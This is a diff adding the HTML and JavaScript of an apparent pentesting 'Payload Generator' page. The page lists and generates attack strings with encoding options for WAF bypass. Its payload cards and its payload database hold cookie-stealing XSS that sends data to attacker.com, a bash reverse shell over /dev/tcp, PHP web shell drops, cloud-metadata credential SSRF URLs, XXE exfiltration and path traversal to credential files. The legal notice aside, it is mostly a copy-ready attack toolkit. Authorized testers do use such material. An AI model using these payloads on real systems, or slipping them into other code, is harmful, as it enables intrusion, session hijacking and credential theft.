@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payload Generator | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .payload-generator { background: var(--bg-card); border: 1px solid var(--border); border-radius: 1rem; padding: 2rem; margin: 2rem 0; }
+    .form-group { margin-bottom: 1.5rem; }
+    .form-group label { display: block; color: var(--primary); font-weight: 600; margin-bottom: 0.5rem; }
+    .form-group select, .form-group input, .form-group textarea { width: 100%; padding: 0.75rem; background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; color: var(--text-primary); font-family: inherit; }
+    .form-group select:focus, .form-group input:focus, .form-group textarea:focus { outline: none; border-color: var(--primary); }
+    .btn { display: inline-flex; align-items: center; gap: 0.5rem; padding: 0.75rem 1.5rem; border: none; border-radius: 0.5rem; cursor: pointer; font-weight: 600; transition: var(--transition); }
+    .btn-primary { background: var(--primary); color: var(--bg-dark); }
+    .btn-primary:hover { background: var(--primary-dark); }
+    .btn-secondary { background: var(--bg-elevated); color: var(--text-primary); border: 1px solid var(--border); }
+    .btn-secondary:hover { border-color: var(--primary); }
+    .output-section { margin-top: 2rem; }
+    .payload-output { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 1rem; font-family: 'Courier New', monospace; word-break: break-all; min-height: 100px; margin-bottom: 1rem; }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 1rem; margin: 1rem 0; }
+    .payload-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1rem; cursor: pointer; transition: var(--transition); }
+    .payload-card:hover { border-color: var(--primary); }
+    .payload-card h4 { color: var(--primary); margin-bottom: 0.5rem; font-size: 0.9rem; }
+    .payload-card p { font-family: monospace; font-size: 0.8rem; color: var(--text-secondary); margin: 0; word-break: break-all; }
+    .category-tabs { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .tab { padding: 0.5rem 1rem; background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 20px; cursor: pointer; font-size: 0.85rem; color: var(--text-secondary); transition: var(--transition); }
+    .tab:hover, .tab.active { background: var(--primary); color: var(--bg-dark); border-color: var(--primary); }
+    .encoding-options { display: flex; gap: 1rem; flex-wrap: wrap; margin: 1rem 0; }
+    .encoding-options label { display: flex; align-items: center; gap: 0.5rem; cursor: pointer; color: var(--text-secondary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .warning-box { background: rgba(255,136,0,0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .warning-box strong { color: #ff8800; }
+    .copy-feedback { position: fixed; bottom: 2rem; right: 2rem; background: var(--primary); color: var(--bg-dark); padding: 1rem 1.5rem; border-radius: 0.5rem; font-weight: 600; opacity: 0; transition: opacity 0.3s; }
+    .copy-feedback.show { opacity: 1; }
+    @media (max-width: 768px) { .payload-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../web/index.html">Web Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / Payloads
+    </div>
+
+    <div class="page-header">
+      <h1>💣 Payload Generator</h1>
+      <p style="color: var(--text-secondary); font-size: 1.1rem; max-width: 800px;">
+        Generate and customize attack payloads for various vulnerability types. Select vulnerability type, encoding options, and context to generate targeted payloads.
+      </p>
+    </div>
+
+    <div class="warning-box">
+      <strong>Legal Notice:</strong> Only use these payloads in authorized penetration tests or security assessments with explicit permission. Unauthorized use is illegal.
+    </div>
+
+    <!-- PAYLOAD GENERATOR -->
+    <div class="payload-generator">
+      <h2 style="margin-top: 0;">⚙️ Generate Payloads</h2>
+      
+      <div class="form-group">
+        <label>Vulnerability Type</label>
+        <select id="vulnType">
+          <option value="sql-injection">SQL Injection</option>
+          <option value="xss">Cross-Site Scripting (XSS)</option>
+          <option value="ssrf">Server-Side Request Forgery (SSRF)</option>
+          <option value="xxe">XML External Entity (XXE)</option>
+          <option value="command-injection">Command Injection</option>
+          <option value="path-traversal">Path Traversal</option>
+          <option value="ldap-injection">LDAP Injection</option>
+          <option value="nosql-injection">NoSQL Injection</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Context / Target</label>
+        <select id="context">
+          <option value="detection">Basic Detection</option>
+          <option value="auth-bypass">Authentication Bypass</option>
+          <option value="data-extraction">Data Extraction</option>
+          <option value="blind">Blind/Time-Based</option>
+          <option value="file-read">File Read</option>
+          <option value="rce">Remote Code Execution</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Database/Framework (for SQL/NoSQL)</label>
+        <select id="dbType">
+          <option value="auto">Auto-Detect</option>
+          <option value="mysql">MySQL</option>
+          <option value="postgresql">PostgreSQL</option>
+          <option value="mssql">MSSQL</option>
+          <option value="oracle">Oracle</option>
+          <option value="mongodb">MongoDB</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Encoding Options</label>
+        <div class="encoding-options">
+          <label><input type="checkbox" id="urlEncode"> URL Encode</label>
+          <label><input type="checkbox" id="base64Encode"> Base64 Encode</label>
+          <label><input type="checkbox" id="unicodeEncode"> Unicode Encode</label>
+          <label><input type="checkbox" id="htmlEncode"> HTML Encode</label>
+          <label><input type="checkbox" id="doubleEncode"> Double Encode</label>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Custom Input (Optional)</label>
+        <input type="text" id="customInput" placeholder="Enter custom string to inject...">
+      </div>
+
+      <div style="display: flex; gap: 1rem;">
+        <button class="btn btn-primary" onclick="generatePayload()"><i class="fas fa-bolt"></i> Generate</button>
+        <button class="btn btn-secondary" onclick="generateRandom()"><i class="fas fa-dice"></i> Random</button>
+      </div>
+
+      <div class="output-section">
+        <h3>Generated Payload</h3>
+        <div class="payload-output" id="payloadOutput">Select options and click Generate to create a payload...</div>
+        <div style="display: flex; gap: 1rem;">
+          <button class="btn btn-primary" onclick="copyPayload()"><i class="fas fa-copy"></i> Copy</button>
+          <button class="btn btn-secondary" onclick="addToFavorites()"><i class="fas fa-star"></i> Save</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- QUICK PAYLOADS -->
+    <div class="category-tabs" id="categoryTabs">
+      <div class="tab active" onclick="filterCategory('all')">All</div>
+      <div class="tab" onclick="filterCategory('sqli')">SQLi</div>
+      <div class="tab" onclick="filterCategory('xss')">XSS</div>
+      <div class="tab" onclick="filterCategory('ssrf')">SSRF</div>
+      <div class="tab" onclick="filterCategory('xxe')">XXE</div>
+      <div class="tab" onclick="filterCategory('command')">Command</div>
+      <div class="tab" onclick="filterCategory('waf-bypass')">WAF Bypass</div>
+    </div>
+
+    <div class="payload-grid" id="payloadGrid">
+      <!-- SQL Injection Payloads -->
+      <div class="payload-card" data-category="sqli">
+        <h4>SQLi - Basic Detection</h4>
+        <p>'</p>
+      </div>
+      <div class="payload-card" data-category="sqli">
+        <h4>SQLi - Auth Bypass</h4>
+        <p>admin'--</p>
+      </div>
+      <div class="payload-card" data-category="sqli">
+        <h4>SQLi - Union Select</h4>
+        <p>' UNION SELECT NULL--</p>
+      </div>
+      <div class="payload-card" data-category="sqli">
+        <h4>SQLi - Time-Based (MySQL)</h4>
+        <p>' AND SLEEP(5)--</p>
+      </div>
+      <div class="payload-card" data-category="sqli">
+        <h4>SQLi - File Read (MySQL)</h4>
+        <p>' UNION SELECT LOAD_FILE('/etc/passwd')--</p>
+      </div>
+
+      <!-- XSS Payloads -->
+      <div class="payload-card" data-category="xss">
+        <h4>XSS - Basic Script</h4>
+        <p><script>alert(1)</script></p>
+      </div>
+      <div class="payload-card" data-category="xss">
+        <h4>XSS - Image Onerror</h4>
+        <p><img src=x onerror=alert(1)></p>
+      </div>
+      <div class="payload-card" data-category="xss">
+        <h4>XSS - SVG Onload</h4>
+        <p><svg onload=alert(1)></p>
+      </div>
+      <div class="payload-card" data-category="xss">
+        <h4>XSS - Cookie Steal</h4>
+        <p><script>fetch('https://attacker.com/c?c='+document.cookie)</script></p>
+      </div>
+      <div class="payload-card" data-category="xss">
+        <h4>XSS - Polyglot</h4>
+        <p>javascript:/*--></title></style></textarea></script>x" onmouseover=alert(1)//></p>
+      </div>
+
+      <!-- SSRF Payloads -->
+      <div class="payload-card" data-category="ssrf">
+        <h4>SSRF - Localhost</h4>
+        <p>http://localhost/</p>
+      </div>
+      <div class="payload-card" data-category="ssrf">
+        <h4>SSRF - AWS Metadata</h4>
+        <p>http://169.254.169.254/latest/meta-data/</p>
+      </div>
+      <div class="payload-card" data-category="ssrf">
+        <h4>SSRF - IPv6 Localhost</h4>
+        <p>http://[::1]:8080/</p>
+      </div>
+      <div class="payload-card" data-category="ssrf">
+        <h4>SSRF - GCP Metadata</h4>
+        <p>http://metadata.google.internal/computeMetadata/v1/</p>
+      </div>
+
+      <!-- XXE Payloads -->
+      <div class="payload-card" data-category="xxe">
+        <h4>XXE - File Read</h4>
+        <p><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo></p>
+      </div>
+      <div class="payload-card" data-category="xxe">
+        <h4>XXE - Blind SSRF</h4>
+        <p><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo></p>
+      </div>
+      <div class="payload-card" data-category="xxe">
+        <h4>XXE - Billion Laughs</h4>
+        <p><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz></p>
+      </div>
+
+      <!-- Command Injection -->
+      <div class="payload-card" data-category="command">
+        <h4>Command - Ping</h4>
+        <p>; ping -c 3 attacker.com</p>
+      </div>
+      <div class="payload-card" data-category="command">
+        <h4>Command - Reverse Shell</h4>
+        <p>; bash -i >& /dev/tcp/attacker.com/4444 0>&1</p>
+      </div>
+      <div class="payload-card" data-category="command">
+        <h4>Command - File Write</h4>
+        <p>; echo '<?php system($_GET["c"]); ?>' > shell.php</p>
+      </div>
+
+      <!-- WAF Bypass -->
+      <div class="payload-card" data-category="waf-bypass">
+        <h4>WAF - Comment Obfuscation</h4>
+        <p>UN/**/ION SEL/**/ECT</p>
+      </div>
+      <div class="payload-card" data-category="waf-bypass">
+        <h4>WAF - Case Variation</h4>
+        <p><ScRiPt>alert(1)</ScRiPt></p>
+      </div>
+      <div class="payload-card" data-category="waf-bypass">
+        <h4>WAF - Double URL Encode</h4>
+        <p>%2527 (single quote)</p>
+      </div>
+    </div>
+
+    <div class="info-box">
+      <strong>Pro Tips:</strong>
+      <ul style="margin: 0.5rem 0 0 1.5rem;">
+        <li>Test payloads in isolated environments first</li>
+        <li>Combine multiple encoding techniques for WAF bypass</li>
+        <li>Use Burp Suite's Intruder for automated payload testing</li>
+        <li>Check specific framework documentation for targeted payloads</li>
+      </ul>
+    </div>
+
+    <a href="../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Home</a>
+  </div>
+</main>
+
+<div class="copy-feedback" id="copyFeedback">Payload copied!</div>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+const payloadDatabase = {
+  'sql-injection': {
+    detection: ["'", '"', "1' OR '1'='1", "1\" OR \"1\"=\"1"],
+    authBypass: ["admin'--", "admin' #", "' OR 1=1--", "') OR ('1'='1"],
+    dataExtraction: ["' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "' UNION SELECT table_name FROM information_schema.tables--"],
+    blind: ["' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--", "'; SELECT pg_sleep(5)--"],
+    fileRead: ["' UNION SELECT LOAD_FILE('/etc/passwd')--", "' UNION SELECT LOAD_FILE('/var/www/html/config.php')--"],
+    rce: ["'; SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"]
+  },
+  'xss': {
+    detection: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
+    authBypass: ["<script>document.location='https://attacker.com/log?c='+document.cookie</script>"],
+    dataExtraction: ["<script>fetch('https://attacker.com?data='+btoa(document.cookie))</script>"],
+    blind: ["<img src=x onerror=fetch('https://attacker.com/'+document.domain)>"],
+    fileRead: ["<iframe src='file:///etc/passwd'>"],
+    rce: ["<script>eval(atob('cmVxdWlyZShhcmdzKQ=='))</script>"]
+  },
+  'ssrf': {
+    detection: ["http://localhost/", "http://127.0.0.1/", "http://0.0.0.0/"],
+    authBypass: ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/"],
+    dataExtraction: ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+    blind: ["http://169.254.169.254/latest/meta-data/instance-id"],
+    fileRead: ["file:///etc/hosts"],
+    rce: ["http://169.254.169.254/latest/user-data/"]
+  },
+  'xxe': {
+    detection: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test "TEST">]><foo>&test;</foo>'],
+    authBypass: ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
+    dataExtraction: ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?f=file:///etc/passwd">]><foo>&xxe;</foo>'],
+    blind: ['<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><foo>&data;</foo>'],
+    fileRead: ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
+    rce: ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>']
+  },
+  'command-injection': {
+    detection: ["; ls", "| ls", "`ls`", "$(ls)"],
+    authBypass: ["; id", "| whoami", "`whoami`", "$(whoami)"],
+    dataExtraction: ["; cat /etc/passwd", "| cat /etc/passwd"],
+    blind: ["; sleep 5", "| sleep 5"],
+    fileRead: ["; cat /var/www/html/config.php"],
+    rce: ["; bash -i >& /dev/tcp/attacker.com/4444 0>&1"]
+  },
+  'path-traversal': {
+    detection: ["../", "..\\..", "....//....//"],
+    authBypass: ["../../../../../../etc/passwd", "..\\..\\..\\..\\..\\windows\\system32\\config\\sam"],
+    dataExtraction: ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"],
+    blind: ["../../../../../../proc/self/environ"],
+    fileRead: ["../../../../../../../../etc/passwd"],
+    rce: ["../../../../../../var/www/html/shell.php%00"]
+  }
+};
+
+function encodePayload(payload, options) {
+  let result = payload;
+  if (options.urlEncode) result = encodeURIComponent(result);
+  if (options.doubleEncode) result = encodeURIComponent(result);
+  if (options.htmlEncode) result = result.replace(/[<>'"&]/g, c => ({'<':'&lt;','>':'&gt;',"'" :'&#39;','"':'&quot;','&':'&amp;'}[c]));
+  if (options.base64Encode) result = btoa(result);
+  if (options.unicodeEncode) result = result.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join('');
+  return result;
+}
+
+function generatePayload() {
+  const vulnType = document.getElementById('vulnType').value;
+  const context = document.getElementById('context').value;
+  const dbType = document.getElementById('dbType').value;
+  const customInput = document.getElementById('customInput').value;
+  
+  const options = {
+    urlEncode: document.getElementById('urlEncode').checked,
+    base64Encode: document.getElementById('base64Encode').checked,
+    unicodeEncode: document.getElementById('unicodeEncode').checked,
+    htmlEncode: document.getElementById('htmlEncode').checked,
+    doubleEncode: document.getElementById('doubleEncode').checked
+  };
+
+  let payload;
+  if (customInput) {
+    payload = customInput;
+  } else if (payloadDatabase[vulnType] && payloadDatabase[vulnType][context]) {
+    const payloads = payloadDatabase[vulnType][context];
+    payload = payloads[Math.floor(Math.random() * payloads.length)];
+  } else {
+    payload = "Payload not available for this combination";
+  }
+
+  document.getElementById('payloadOutput').textContent = encodePayload(payload, options);
+}
+
+function generateRandom() {
+  const vulnTypes = Object.keys(payloadDatabase);
+  const randomVuln = vulnTypes[Math.floor(Math.random() * vulnTypes.length)];
+  document.getElementById('vulnType').value = randomVuln;
+  
+  const contexts = Object.keys(payloadDatabase[randomVuln]);
+  const randomContext = contexts[Math.floor(Math.random() * contexts.length)];
+  document.getElementById('context').value = randomContext;
+  
+  generatePayload();
+}
+
+function copyPayload() {
+  const payload = document.getElementById('payloadOutput').textContent;
+  navigator.clipboard.writeText(payload);
+  const feedback = document.getElementById('copyFeedback');
+  feedback.classList.add('show');
+  setTimeout(() => feedback.classList.remove('show'), 2000);
+}
+
+function addToFavorites() {
+  alert('Payload saved to favorites (coming soon)');
+}
+
+function filterCategory(category) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  event.target.classList.add('active');
+  
+  document.querySelectorAll('.payload-card').forEach(card => {
+    if (category === 'all' || card.dataset.category === category) {
+      card.style.display = 'block';
+    } else {
+      card.style.display = 'none';
+    }
+  });
+}
+
+document.querySelectorAll('.payload-card').forEach(card => {
+  card.addEventListener('click', () => {
+    const payload = card.querySelector('p').textContent;
+    navigator.clipboard.writeText(payload);
+    const feedback = document.getElementById('copyFeedback');
+    feedback.textContent = 'Copied!';
+    feedback.classList.add('show');
+    setTimeout(() => {
+      feedback.classList.remove('show');
+      feedback.textContent = 'Payload copied!';
+    }, 2000);
+  });
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+</script>
+
+</body>
+</html>
